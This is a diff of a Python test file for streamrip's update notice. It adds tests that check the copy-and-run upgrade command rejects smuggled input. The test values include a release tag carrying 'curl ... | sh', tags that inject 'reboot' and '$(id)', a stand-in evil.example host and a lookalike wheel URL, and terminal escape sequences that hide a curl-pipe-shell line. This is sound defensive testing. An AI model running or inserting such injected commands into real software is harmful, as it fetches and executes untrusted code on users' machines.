@@ -493,7 +493,10 @@ def test_version_comparison_is_numeric():
 
 
 GIT = "git+https://github.com/Stensel8/streamrip.git"
-WHEEL = "https://example/streamrip.whl"
+WHEEL = (
+    "https://github.com/Stensel8/streamrip/releases/download/v2.4.5/"
+    "streamrip-2.4.5-py3-none-any.whl"
+)
 
 
 @pytest.mark.parametrize(
@@ -542,6 +545,47 @@ def test_upgrade_command(monkeypatch, uv, uv_tool, kwargs, command):
     monkeypatch.setattr(cli_module.shutil, "which", lambda _: uv)
     monkeypatch.setattr(cli_module, "_is_uv_tool_install", lambda: uv_tool)
     assert _upgrade_command("2.4.5", **kwargs) == command
+
+
+# The update notice asks the user to copy and run a command. What goes into it
+# comes out of a response: a tag is whatever a release was called.
+
+
+@pytest.mark.parametrize(
+    "tag",
+    ["99.0.0;curl${IFS}https://x/i|sh", "99.0.0 && reboot", "$(id)9", '9"9', "9\n9"],
+)
+def test_a_tag_that_is_no_version_is_no_newer_version(tag):
+    assert not is_newer_version(tag, "2.3.0")
+
+
+@pytest.mark.parametrize(
+    "wheel",
+    [
+        "https://evil.example/streamrip-9.whl",
+        "https://github.com/someone/else/releases/download/v9/streamrip-9.whl",
+        "https://github.com.evil.example/Stensel8/streamrip/releases/download/v9/s.whl",
+        WHEEL + '" ; reboot ; "',
+        "http://" + WHEEL.removeprefix("https://"),
+    ],
+)
+def test_only_a_wheel_of_our_own_release_goes_into_the_command(monkeypatch, wheel):
+    monkeypatch.setattr(cli_module.shutil, "which", lambda _: "/uv")
+    monkeypatch.setattr(cli_module, "_is_uv_tool_install", lambda: True)
+    assert _upgrade_command("2.4.5", wheel_url=wheel).endswith(f"{GIT}@v2.4.5")
+    opencommit = WHEEL.replace("github.com", "opencommit.eu")
+    assert opencommit in _upgrade_command("2.4.5", wheel_url=opencommit)
+
+
+def test_release_notes_cannot_rewrite_the_terminal(monkeypatch, capsys):
+    monkeypatch.setattr(cli_module.shutil, "which", lambda _: "/odd [/bold] path/uv")
+    cli_module._print_update_notice(
+        "9.9.9", "Fixes.\x1b[1A\x1b[2Kcurl x | sh\x1b]52;c;eA==\x07", is_release=True
+    )
+    shown = capsys.readouterr().err
+    assert "\x1b" not in shown
+    assert "\x07" not in shown
+    assert "/odd [/bold] path/uv" in shown.replace("\n", "")  # a path is text too
 
 
 @pytest.mark.parametrize(
